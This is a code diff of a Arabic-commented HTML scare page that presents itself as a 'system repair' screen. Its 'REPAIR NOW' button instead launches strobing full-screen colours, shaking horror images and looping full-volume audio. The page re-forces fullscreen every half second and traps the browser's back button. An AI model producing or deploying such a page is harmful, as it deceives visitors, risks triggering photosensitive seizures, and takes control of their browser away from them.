@@ -3,94 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM FAILURE - RELOAD</title>
+    <title>SYSTEM CRITICAL ERROR</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; cursor: none; }
         
-        #overlay { 
+        /* واجهة الدخول سواسوة */
+        #welcome { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #fff; z-index: 10000; display: flex; 
+            background: #ffffff; z-index: 10000; display: flex; 
             flex-direction: column; justify-content: center; align-items: center; 
         }
-        .btn-start { 
-            background: #ff0000; color: #fff; border: 10px solid #000; 
-            padding: 35px 70px; font-size: 35px; font-weight: bold; 
-            border-radius: 60px; cursor: pointer; box-shadow: 0 12px 0 #900;
+        .fix-btn { 
+            background: #ff0000; color: #fff; border: 8px solid #000; 
+            padding: 30px 60px; font-size: 30px; font-weight: bold; 
+            border-radius: 50px; cursor: pointer; box-shadow: 0 10px 0 #800;
         }
 
-        /* أنيميشن الألوان الصارخة سواسوة */
-        @keyframes flash_vibrant {
+        /* أنيميشن ألوان الفيروسات سواسوة */
+        @keyframes virus_flash {
             0% { background: #ff0000; } 33% { background: #00ff00; }
             66% { background: #0000ff; } 100% { background: #ff00ff; }
         }
-        .active-bg { animation: flash_vibrant 0.04s infinite; }
+        .active-chaos { animation: virus_flash 0.05s infinite; }
 
-        #stage { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; }
+        /* مصفوفة الصور سواسوة */
+        #display_area { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; }
         .h-img { 
             position: absolute; width: 100%; height: 100%; object-fit: cover; 
-            opacity: 0; mix-blend-mode: difference; 
+            opacity: 0; filter: contrast(1.5) brightness(1.2);
         }
 
-        /* أنيميشن الحركة العنيفة سواسوة */
-        @keyframes horror_shake {
-            0% { transform: scale(1.1) translate(10px, -10px); filter: invert(0); }
-            50% { transform: scale(1.6) translate(-30px, 30px) rotate(8deg); filter: invert(1) contrast(4); }
-            100% { transform: scale(1.3) translate(20px, 20px) rotate(-8deg); }
+        /* أنيميشن الحركة المرعبة (تتحرك بلا سرعة خيالية) سواسوة */
+        @keyframes ghost_move {
+            0% { transform: scale(1.1) translate(0,0); }
+            50% { transform: scale(1.3) translate(-15px, 15px) rotate(2deg); filter: invert(0.2); }
+            100% { transform: scale(1.1) translate(15px, -15px) rotate(-2deg); }
         }
-        .vibrate-heavy { opacity: 1 !important; animation: horror_shake 0.02s infinite linear; }
+        .vibrate { opacity: 1 !important; animation: ghost_move 0.1s infinite alternate; }
     </style>
 </head>
-<body id="b">
+<body id="main_body">
 
-    <div id="overlay">
-        <h1 style="color:#000; font-family:Arial;">FIX SYSTEM LAG</h1>
-        <button class="btn-start" onclick="igniteChaos()">REPAIR NOW</button>
+    <div id="welcome">
+        <h1 style="color:#000; font-family:Arial;">REPAIRING SYSTEM...</h1>
+        <button class="fix-btn" onclick="startVirus()">REPAIR NOW</button>
     </div>
 
-    <div id="stage">
-        <img class="h-img" id="i1" src="https://i.ibb.co/RTTgVkyw/image.jpg">
-        <img class="h-img" id="i2" src="https://i.ibb.co/VYQnMt9R/image.jpg">
-        <img class="h-img" id="i3" src="https://i.ibb.co/ym4GK9sk/image.jpg">
-        <img class="h-img" id="i4" src="https://i.ibb.co/4H7RV4m/image.jpg">
+    <div id="display_area">
+        <img class="h-img" id="img1" src="https://i.ibb.co/RTTgVkyw/image.jpg">
+        <img class="h-img" id="img2" src="https://i.ibb.co/VYQnMt9R/image.jpg">
+        <img class="h-img" id="img3" src="https://i.ibb.co/ym4GK9sk/image.jpg">
+        <img class="h-img" id="img4" src="https://i.ibb.co/4H7RV4m/image.jpg">
     </div>
 
     <script>
-        const ids = ['i1', 'i2', 'i3', 'i4'];
-        // الصوت المباشر الجديد سواسوة
-        const audioLink = "https://www.myinstants.com/media/sounds/nykwny.mp3";
+        const imageList = ['img1', 'img2', 'img3', 'img4'];
+        // الصوت الأخير فقط سواسوة
+        const targetAudio = "https://www.myinstants.com/media/sounds/nykwny.mp3";
 
-        function igniteChaos() {
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('b').classList.add('active-bg');
-            document.getElementById('stage').style.display = 'block';
+        function startVirus() {
+            document.getElementById('welcome').style.display = 'none';
+            document.getElementById('main_body').classList.add('active-chaos');
+            document.getElementById('display_area').style.display = 'block';
 
-            // ملء الشاشة القسري سواسوة
-            let doc = document.documentElement;
-            if (doc.requestFullscreen) doc.requestFullscreen();
+            // ملء الشاشة سواسوة
+            let el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
 
-            // تشغيل الصوت بقوة قصوى وتكرار سواسوة
-            let audio = new Audio(audioLink);
+            // تشغيل الصوت المطلوب فقط سواسوة
+            let audio = new Audio(targetAudio);
             audio.loop = true;
             audio.volume = 1.0;
-            const forcePlay = () => audio.play().catch(() => setTimeout(forcePlay, 50));
-            forcePlay();
+            const playSound = () => audio.play().catch(() => setTimeout(playSound, 100));
+            playSound();
 
             // نظام التبديل كل 10 ثوانٍ سواسوة
-            let current = 0;
-            document.getElementById(ids[current]).classList.add('vibrate-heavy');
+            let currentIdx = 0;
+            document.getElementById(imageList[currentIdx]).classList.add('vibrate');
 
             setInterval(() => {
-                document.getElementById(ids[current]).classList.remove('vibrate-heavy');
-                current = (current + 1) % ids.length;
-                document.getElementById(ids[current]).classList.add('vibrate-heavy');
-            }, 10000); // 10 ثوانٍ سواسوة
+                document.getElementById(imageList[currentIdx]).classList.remove('vibrate');
+                currentIdx = (currentIdx + 1) % imageList.length;
+                document.getElementById(imageList[currentIdx]).classList.add('vibrate');
+            }, 10000); // 10 ثوانٍ مريغلة
 
-            // قفل الخروج والحبس سواسوة
+            // قفل الخروج سواسوة
             setInterval(() => {
-                if (!document.fullscreenElement) doc.requestFullscreen();
-                window.scrollTo(0, 0);
-            }, 300);
-
+                if (!document.fullscreenElement) el.requestFullscreen();
+            }, 500);
+            
             history.pushState(null, null, location.href);
             window.onpopstate = () => history.go(1);
         }
